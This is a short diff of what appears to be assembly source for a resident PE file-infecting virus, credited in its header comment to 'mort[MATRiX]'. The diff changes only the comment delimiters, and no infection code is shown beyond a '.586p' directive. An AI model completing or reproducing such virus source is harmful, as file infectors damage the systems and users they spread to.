@@ -1,6 +1,6 @@
 
 
-comment "
+comment #
 2M - created by mort[MATRiX]
          - simple resident PE infetor
          - no payload (ok,...the last one),...maybe there's no check 
@@ -10,7 +10,7 @@ comment "
          - compiled in TASM (...)
          - well, 2 many bugs, but i cant c them...
          - and as allways 10x 2 LJ
-"
+#
 
 
 .586p
